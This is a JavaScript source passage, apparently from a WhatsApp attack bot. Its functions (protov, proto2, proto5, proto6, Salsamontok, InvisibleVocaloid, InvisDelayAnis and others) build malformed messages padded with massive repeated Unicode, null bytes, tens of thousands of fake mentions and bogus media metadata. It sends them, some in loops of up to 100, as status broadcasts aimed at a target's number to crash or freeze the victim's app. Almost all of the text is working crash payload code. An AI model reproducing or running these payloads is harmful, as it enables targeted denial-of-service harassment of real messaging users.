            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await Abim.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await Abim.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Abim.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Abim.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await Abim.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 6000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};
async function protov(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@xata",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await Abim.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Abim.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}
async function proto2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "FINFIXTER‌‌-‣ ",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Abim.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function proto3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
    
    await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await Abim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
async function proto5(target, mention) {
console.log(chalk.yellow(`Succesfully Sendding Protocolbug5 to ${target}`));
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            "1${Math.floor(Math.random() * 500000)}@s.whatsapp.net"
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "STELLAR BRO",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳSTELLAR NECROSIS ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };
    
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Abim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function proto6(target, mention) {
console.log(chalk.green(`Succesfully Sendding Protocolbug6 to ${target}`));
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`) 
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "☠️ - んジェラルド - ☠️",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            },
            isSampled: true,
            mentionedJid: mentionedList,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Abim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function Salsamontok(target) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await Abim.relayMessage(target, message, {
participant: {
jid: target
}
});
}
async function InvisibleVocaloid(target) {
  const sarzz1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            title: "Sarzz | Vocaloid Trash",
            text: "SarzzJirr",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

  const sarzz2 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  for (const msg of [sarzz1, sarzz2]) {
    await Abim.relayMessage(
      "status@broadcast",
      msg.message ?? msg,
      {
        messageId: msg.key?.id || undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      }
    );

    console.log(`Vocaloid Sending Bug To ${target} suksesfull`);
  }
}
async function InvisDelayAnis(Target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "../Vortunix Infinity..",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "../GyzenLyoraa..."
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
